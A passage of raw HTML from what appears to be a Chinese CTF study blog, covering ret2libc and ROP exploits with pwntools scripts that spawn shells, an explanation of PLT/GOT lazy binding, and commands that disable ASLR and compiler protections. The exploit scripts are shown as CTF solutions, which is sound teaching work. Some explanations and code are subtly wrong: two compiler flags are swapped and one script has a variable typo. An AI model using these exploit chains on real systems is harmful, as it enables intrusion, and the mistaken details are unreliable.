hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc.address = puts_addr - libc.symbols[&apos;puts&apos;]</span><br><span class="line">system_addr = libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_addr = next(libc.search(&apos;/bin/sh&apos;))</span><br><span class="line">print &quot;[*]leak libc addr: &quot; + hex(libc.address)</span><br><span class="line">print &quot;[*]system addr: &quot; + hex(system_addr)</span><br><span class="line">print &quot;[*]binsh addr: &quot; + hex(binsh_addr)</span><br><span class="line">print &quot;--&quot; * 20</span><br><span class="line">print &quot;[*]sending payload2 to getshell...&quot;</span><br><span class="line"></span><br><span class="line">payload2 = flat([&quot;B&quot; * 112, system_addr, &quot;CCCC&quot;, binsh_addr])</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="train-cs-nctu-edu-tw：ret2libc"><a href="#train-cs-nctu-edu-tw：ret2libc" class="headerlink" title="train.cs.nctu.edu.tw：ret2libc"></a>train.cs.nctu.edu.tw：ret2libc</h3><p>这道题开启了 NX 保护，然而运行的时候会把 puts 的地址跟 /bin/sh 的地址告诉我们，使用 pwntools 可以把地址提取出来，再根据 libcsearcher 查出 system 的地址，这样就可以 getshell 了</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">p=process(&apos;./pwn&apos;)</span><br><span class="line">p.recvuntil(&apos;is &apos;)</span><br><span class="line">bin_addr = int(p.recvuntil(&apos;\n), 16)</span><br><span class="line">print hex(bin_addr)</span><br><span class="line">p.recvuntil(&apos;is &apos;)</span><br><span class="line">puts_addr = int(p.recvuntil(&apos;\n&apos;), 16)</span><br><span class="line">print hex(puts_addr)</span><br><span class="line">libc=LibcSearcher(&apos;puts&apos;,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(&apos;puts&apos;)</span><br><span class="line">sys_addr=libc_base+libc.dump(&apos;system&apos;)</span><br><span class="line">payload2=&apos;a&apos;*32+p32(sys_addr)+p32(1234)+p32(bin_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>讲一下 <code>p.recvuntil(&#39;is &#39;)</code> 代表的是 “is “之前的那一块，当下一个 recvuntil 的时候就会把这那块去掉了</p><p>把脚本里的第一个 <code>p.recvuntil(&#39;is &#39;)</code> 替换成 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print p.recvuntil(&apos;of &apos;)</span><br><span class="line">print p.recvuntil(&apos;is &apos;)</span><br></pre></td></tr></table></figure><p>就可以看出来作用是什么</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574586037138-97e8c208-e876-48ca-b9cd-0a64d829175f.png" alt="image.png"></p><p>ps.正常会输出这一些（”^C”是ctrl+c退出造成的，不包括）：</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574586260374-add330e2-4491-4b46-9980-2f450c34faf6.png" alt="image.png"></p><h2 id="Linux动态链接"><a href="#Linux动态链接" class="headerlink" title="Linux动态链接"></a>Linux动态链接</h2><p><a href="https://blog.csdn.net/linyt/article/details/51635768" target="_blank" rel="noopener">参考博文</a></p><p>关于动态链接与静态链接，可以打个比方就是：如果我的文章引用了别人的一部分文字，在我发布文章的时候把别人的段落复制到我的文章里面就属于静态连接，而做一个超链接让你们自己去看就属于动态链接了</p><h3 id="PLT-amp-GOT"><a href="#PLT-amp-GOT" class="headerlink" title="PLT&amp;GOT"></a>PLT&amp;GOT</h3><p>linux下的动态链接是通过PLT&amp;GOT来实现的，这里做一个实验，通过这个实验来理解</p><p>使用如下源代码 test.c：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void print_banner()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Welcome to World of PLT and GOT\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依次使用下列命令进行编译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -g -o test.o -c test.c -m32</span><br><span class="line">gcc -o test test.o -m32</span><br></pre></td></tr></table></figure><p>这样除了原有的 test.c 还有个 test.o 以及可执行文件 test</p><p>通过 <code>objdump -d test.o</code> 可以查看反汇编</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574510177475-db49a7d5-6909-421e-a868-6829c9a7b4a4.png" alt="image.png"></p><p>printf() 和函数是在 glibc 动态库里面的，只有当程序运行起来的时候才能确定地址，所以此时的 printf() 函数先用 fc ff ff ff 也就是有符号数的 -4 代替</p><p>运行时进行重定位是无法修改代码段的，只能将 printf 重定位到数据段，但是已经编译好的程序，调用 printf 的时候怎么才能找到这个地址呐？</p><p>链接器会额外生成一小段代码，通过这段代码来获取 printf() 的地址，像下面这样，进行链接的时候只需要对printf_stub() 进行重定位操作就可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line">printf_stub:</span><br><span class="line">    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址</span><br><span class="line">    jmp rax // 跳过去执行printf函数</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的储存地址,这里储存printf函数重定位后的地址</span><br></pre></td></tr></table></figure><p>总体来说，动态链接每个函数需要两个东西：</p><p>1、用来存放外部函数地址的数据段</p><p>2、用来获取数据段记录的外部函数地址的代码</p><p>应有两个表，一个用来存放外部的函数地址的数据表称为<strong>全局偏移表</strong>（<strong>GOT</strong>, Global Offset Table），那个存放额外代码的表称为<strong>程序链接表</strong>（<strong>PLT</strong>，Procedure Link Table）</p><p><img src="https://cdn.nlark.com/yuque/0/2019/jpeg/268938/1574513788142-e66171f3-6300-4e14-ab57-cc301c936829.jpeg" alt="20160611124517413.jpg"></p><p>可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址</p><p>那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制</p><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>只有动态库函数在被调用时，才会地址解析和重定位工作，为此可以使用类似这样的代码来实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//一开始没有重定位的时候将 printf@got 填成 lookup_printf 的地址</span><br><span class="line">void printf@plt()</span><br><span class="line">&#123;</span><br><span class="line">address_good:</span><br><span class="line">    jmp *printf@got   </span><br><span class="line">lookup_printf:</span><br><span class="line">    调用重定位函数查找 printf 地址，并写到 printf@got</span><br><span class="line">    goto address_good;//再返回去执行address_good</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明一下这段代码工作流程，一开始，printf@got 是 lookup_printf 函数的地址，这个函数用来寻找 printf() 的地址，然后写入 printf@got，lookup_printf 执行完成后会返回到 address_good，这样再 jmp 的话就可以直接跳到printf 来执行了</p><p>也就是说这样的机制的话如果不知道 printf 的地址，就去找一下，知道的话就直接去 jmp 执行 printf 了</p><p>接下来，我们就来看一下这个“找”的工作是怎么实现的：</p><p>通过 <code>objdump -d test &gt; test.asm</code> 可以看到其中 plt 表项有三条指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">080482d0 &lt;common@plt&gt;:</span><br><span class="line"> 80482d0:   ff 35 04 a0 04 08       pushl  0x804a004</span><br><span class="line"> 80482d6:   ff 25 08 a0 04 08       jmp    *0x804a008</span><br><span class="line"> 80482dc:   00 00                   add    %al,(%eax)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">080482e0 &lt;puts@plt&gt;:</span><br><span class="line"> 80482e0:   ff 25 0c a0 04 08       jmp    *0x804a00c</span><br><span class="line"> 80482e6:   68 00 00 00 00          push   $0x0</span><br><span class="line"> 80482eb:   e9 e0 ff ff ff          jmp    80482d0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line">080482f0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80482f0:   ff 25 10 a0 04 08       jmp    *0x804a010</span><br><span class="line"> 80482f6:   68 08 00 00 00          push   $0x8</span><br><span class="line"> 80482fb:   e9 d0 ff ff ff          jmp    80482d0 &lt;_init+0x28&gt;</span><br></pre></td></tr></table></figure><p>ps.这里 plt 表的第一项使用 objdump 的时候给没有符号名的一项自动改成了离他最近的一项，为了避免引起误会，改成了 common，而且随着不断深入，会发现，确实可以叫 common</p><p>其中除第一个表项以外，plt 表的第一条都是跳转到对应的 got 表项，而 got 表项的内容我们可以通过 gdb 来看一下，如果函数还没有执行的时候，这里的地址是对应 plt 表项的下一条命令，即 push 0x0</p><p>（说一下怎么查看，先 <code>gdb test</code> 然后 <code>b main</code>，再 <code>run</code>， 再 <code>x/x jmp的那个地址</code> 就可以）</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580779496150-487cd998-b4af-4bb0-ad41-9ab376a7f8ff.png" alt="image.png"></p><p>还得之前我们说的，在还没有执行过函数之前 printf@got 的内容是 lookup_printf 函数的地址吗，这就是要去找 printf 函数的地址了</p><p>现在要做的是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push   $0x0    //将数据压到栈上，作为将要执行的函数的参数</span><br><span class="line">jmp    0x80482d0   //去到了第一个表项</span><br></pre></td></tr></table></figure><p>接下来继续</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">080482d0 &lt;common@plt&gt;:</span><br><span class="line">pushl  0x804a004  //将数据压到栈上，作为后面函数的参数</span><br><span class="line">jmp    *0x804a008 //跳转到函数</span><br><span class="line">add    %al,(%eax)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>我们同样可以使用 gdb 来看一下这里面到底是什么，可以看到，在没有执行之前是全 0</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780401627-53526fc2-3646-4478-b040-8f1fb30ca0dc.png" alt="image.png"></p><p>当执行后他有了值</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780428606-42b2c58b-1809-43dc-8b4e-afa79a1456cf.png" alt="image.png"></p><p>这个值对应的函数是 <code>_dl_runtime_resolve</code></p><p>那现在做一个小总结：</p><p>在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的</p><p>xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve</p><p>到这里我们还需要知道</p><ol><li>_dl_runtime_resolve 是怎么知道要查找 printf 函数的</li><li>_dl_runtime_resolve 找到 printf 函数地址之后，它怎么知道回填到哪个 GOT 表项</li></ol><p>第一个问题，在 xxx@plt 中，我们在 jmp 之前 push 了一个参数，每个 xxx@plt 的 push 的操作数都不一样，那个参数就相当于函数的 id，告诉了 _dl_runtime_resolve 要去找哪一个函数的地址</p><p>在 elf文件中 .rel.plt 保存了重定位表的信息，使用 <code>readelf -r test</code> 命令可以查看 test 可执行文件中的重定位信息</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780626820-92e99da4-b8f0-43c7-b9df-1ba09342a0ff.png" alt="image.png"></p><p>这里有些问题，对应着大佬博客说 plt 中 push 的操作数，就是对应函数在.rel.plt 段的偏移量，但是没对比出来</p><p>第二个问题，看 .rel.plt 的位置就对应着 xxx@plt 里 jmp 的地址</p><blockquote><p>在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：</p><p><strong>got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址</strong> </p><p><strong>got [1]：本 ELF 的 link_map 数据结构描述符地址</strong> </p><p><strong>got [2]：_dl_runtime_resolve 函数的地址</strong></p><p>动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项</p></blockquote><p><strong>跟着大佬的流程图来走一遍：</strong></p><p>第一次调用</p><p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739542097-a6d2738b-9a08-4b5f-acd8-d5f2c4d77278.jpeg" alt="img"></p><p>之后再次调用<img src="https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739570228-64997692-8003-4c10-acf2-2c8d91095e3c.jpeg" alt="img"></p><h2 id="Practice"><a href="#Practice" class="headerlink" title="Practice"></a>Practice</h2><h3 id="train-cs-nctu-edu-tw：rop"><a href="#train-cs-nctu-edu-tw：rop" class="headerlink" title="train.cs.nctu.edu.tw：rop"></a>train.cs.nctu.edu.tw：rop</h3><p>没找到题目，从<a href="http://baymrx.me/2019/08/17/PWN刷题记录——train-cs-nctu-edu-tw-rop/" target="_blank" rel="noopener">大佬博客</a>里面找到的，题目使用 nc 连上以后会输出这些 gadgets 需要自己去构造 payload</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574668172344-2d5dce6a-3e6a-437a-bcc7-5a06950ee918.png" alt="1566026309029.png"></p><p>把 push 的那一些16进制转换一下</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574668407609-8e44a3b0-4464-41c1-aad9-e9163a76d1c1.png" alt="image.png"></p><p>大佬说通过这些就可以构造出 payload 了</p><p>exp：我连不上。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = remote(&apos;bamboofox.cs.nctu.edu.tw&apos;,10001)</span><br><span class="line">payload = &quot;9,9,1,10,9,3,3,12,4,12,2,2,8,8,8,8,8,0&quot;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="2013-PlaidCTF-ropasaurusrex"><a href="#2013-PlaidCTF-ropasaurusrex" class="headerlink" title="2013-PlaidCTF-ropasaurusrex"></a>2013-PlaidCTF-ropasaurusrex</h3><p>没有 system 和 /bin/sh，通过 ret2libc 的方法在libc里面找到，这里注意一下第一次泄露的是 got 表的内容，写成了 plt 的，结果废了两个小时没看出来，还以为又出现了什么超出知识水平的操作，，CTF需要视力！！</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">p=process(&apos;./rop&apos;)</span><br><span class="line">elf=ELF(&apos;./rop&apos;)</span><br><span class="line">write_plt=elf.plt[&apos;write&apos;]</span><br><span class="line">write_got=elf.got[&apos;write&apos;]</span><br><span class="line">payload=&apos;a&apos;*140+p32(write_plt)+p32(0x80483F4)+p32(1)+p32(write_got)+p32(4)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr=u32(p.recv(4))</span><br><span class="line">libc=LibcSearcher(&apos;write&apos;,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(&apos;write&apos;)</span><br><span class="line">sys_addr=libc_base+libc.dump(&apos;system&apos;)</span><br><span class="line">bin_addr=libc_base+libc.dump(&apos;str_bin_sh&apos;)</span><br><span class="line">payload1=&apos;a&apos;*140+p32(sys_addr)+p32(1234)+p32(bin_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Defcon-2015-Qualifier-R0pbaby"><a href="#Defcon-2015-Qualifier-R0pbaby" class="headerlink" title="Defcon 2015 Qualifier: R0pbaby"></a>Defcon 2015 Qualifier: R0pbaby</h3><p>checksec 检查一下，发现是64位程序，所以参数应该是存储在 rdi 寄存器上</p><p>64 位程序当参数少于 7 个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9</p><p>通过 ROPgadget –binary /libc/x86_64-linux-gnu/ libc.so.6 –only “pop|ret” | grep “rdi”</p><p>获取到 pop rdi ；ret 的地址：</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574663502432-70335a77-3256-4ba8-adf0-f7208c5b7ed7.png" alt="image.png"></p><p>通过程序自身提供的功能，可以获取到 libc 的地址与任意函数的地址</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574663904109-6e3aa29a-7ae6-48f4-98f6-7ba99c5cf511.png" alt="image.png"></p><p>同时第三个功能存在溢出，经过计算溢出的长度为 8 </p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574664880977-b87b80fb-e80a-43ad-b6c6-22fad2b1bda8.png" alt="image.png"></p><p>写 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">rdi_offset=<span class="number">0x0000000000021102</span></span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'symbol: '</span>)</span><br><span class="line">p.sendline(<span class="string">'system'</span>)</span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">sys_addr=p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>)</span><br><span class="line">sys_addr=int(sys_addr,<span class="number">16</span>)</span><br><span class="line">libc=LibcSearcher(<span class="string">'system'</span>,sys_addr)</span><br><span class="line">libc_base=sys_addr-libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_addr=libc_base+libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">rdi_addr=libc_base+rdi_offset</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">8</span>+p64(rdi_addr)+p64(bin_addr)+p64(sys_addr)</span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'): '</span>)</span><br><span class="line">length=len(payload)</span><br><span class="line"><span class="keyword">print</span> length</span><br><span class="line"><span class="keyword">print</span> str(length)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>大佬的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">ropbaby = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line">context.word_size = <span class="number">64</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfuncaddress</span><span class="params">(func)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'symbol: '</span>)</span><br><span class="line">    sh.sendline(func)</span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    addr = sh.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> int(addr, <span class="number">16</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addropbuff</span><span class="params">(payload)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'): '</span>)</span><br><span class="line">    length = len(payload)</span><br><span class="line">    sh.sendline(str(length))</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">rdi_ret_offset = <span class="number">0x0000000000021102</span></span><br><span class="line">system_addr = getfuncaddress(<span class="string">'system'</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">'system'</span>, system_addr)</span><br><span class="line">libc_base = system_addr - libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libc.dump(<span class="string">'str_bin_sh'</span>) + libc_base</span><br><span class="line">rdi_ret = rdi_ret_offset + libc_base</span><br><span class="line"><span class="keyword">print</span> hex(system_addr), hex(binsh_addr), hex(rdi_ret)</span><br><span class="line">payload = flat([<span class="string">'b'</span> * <span class="number">8</span>, rdi_ret, binsh_addr, system_addr])</span><br><span class="line">addropbuff(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PWN-Tips-1</title>
      <link href="/2020/02/14/PWN-Tips-1/"/>
      <url>/2020/02/14/PWN-Tips-1/</url>
      
        <content type="html"><![CDATA[<h2 id="题目源码编译"><a href="#题目源码编译" class="headerlink" title="题目源码编译"></a>题目源码编译</h2><p>如果希望什么保护都没有的编译命令一般是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -z execstack -o level1 level1.c</span><br></pre></td></tr></table></figure><ul><li><code>-m32</code>的意思是编译为32位的程序，64位操作系统有时候需要安装兼容包</li><li><code>-fno-stack-protector</code>会关闭DEP</li><li><code>-z execstack</code>会关闭Stack Protector</li></ul><p>在root权限下执行，或者sudo执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>这样就关闭掉了整个系统的ASLR</p><h2 id="gdb调试内存"><a href="#gdb调试内存" class="headerlink" title="gdb调试内存"></a>gdb调试内存</h2><p>gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行程序的时候，buf的位置会固定在别的地址上，这里采用的方法是开启：core dump</p><p>在root权限下执行，或者sudo执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c unlimited</span><br></pre></td></tr></table></figure><p>开启之后，当出现内存错的时候，系统会生成一个core dump文件在当前目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了，使用gdb调试转储：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb name core</span><br></pre></td></tr></table></figure><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>Linux的系统调用通过<code>int 80h</code>实现，用系统调用号来区分入口函数。应用程序调用系统调用的过程是：</p><ul><li>把系统调用的编号存入EAX</li><li>把函数参数存入其它通用寄存器</li><li>触发0x80号中断（int 0x80）</li></ul><p>那么我们如果希望通过系统调用来获取shell就需要把系统调用的参数放入各个寄存器，然后执行int 0x80就可以了</p><p>如果说想通过系统调用执行的是：<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>（32位程序）</p><p>那么eax寄存器应该存放系统调用号，查看execve的系统调用号：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/include/asm/unistd_32.h | grep execve</span><br></pre></td></tr></table></figure><p>可以得到为11，转换为16进制就为0xb，所以eax中应该存放0xb</p><p>ebx应该存放想要执行的”/bin/sh”的地址，还有两个参数设置为0</p><p>所以现在需要做的就是让：</p><ul><li>eax=0xb</li><li>ebx=”/bin/sh”的地址</li><li>ecx=0</li><li>edx=0</li></ul><p>只需要让栈顶的值是0xb然后可以通过pop eax达到目的，要用ROPgadget来查找，使用命令找到pop eax：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget--binary rop --only 'pop|ret' | grep 'eax'</span><br></pre></td></tr></table></figure><p>类似的，通过这条命令寻找控制其它寄存器的地址，找到可以控制多个的。同时使用找到字符串在什么地方</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget--binary rop --string '/bin/sh'</span><br></pre></td></tr></table></figure><p>以及还有需要的int 0x80</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget--binary rop --only 'int'</span><br></pre></td></tr></table></figure><p>类似的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./rop'</span>)</span><br><span class="line">int_addr=<span class="number">0x8049421</span></span><br><span class="line">bin_addr=<span class="number">0x80be408</span></span><br><span class="line">pop_other_ret=<span class="number">0x806eb90</span></span><br><span class="line">pop_eax_ret=<span class="number">0x80bb196</span></span><br><span class="line">paylaod=<span class="string">'a'</span>*<span class="number">112</span>+p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_other_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_addr)+p32(int_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span 